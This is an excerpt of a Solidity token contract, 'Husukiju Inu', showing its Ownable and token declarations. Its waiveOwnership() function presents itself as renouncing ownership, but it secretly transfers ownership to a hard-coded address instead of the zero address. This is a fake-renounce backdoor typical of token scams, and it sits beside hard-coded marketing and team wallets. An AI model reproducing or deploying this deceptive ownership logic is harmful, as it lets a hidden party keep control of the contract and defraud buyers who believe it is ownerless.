...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x196DbC2BC4A18cD9B15D8a04519f656112Cf7EE6));
        _owner = address(0x196DbC2BC4A18cD9B15D8a04519f656112Cf7EE6);
    }
...
contract Husukiju is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Husukiju Inu";
    string private _symbol ="Husukiju";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x8dFAD21C59Da54Ca097334661e5E5e294635F45E);
    address payable public teamWalletAddress = payable(0xdC62eC62cF4Cd1Ba93dA5724b7877ecb71dc713A);
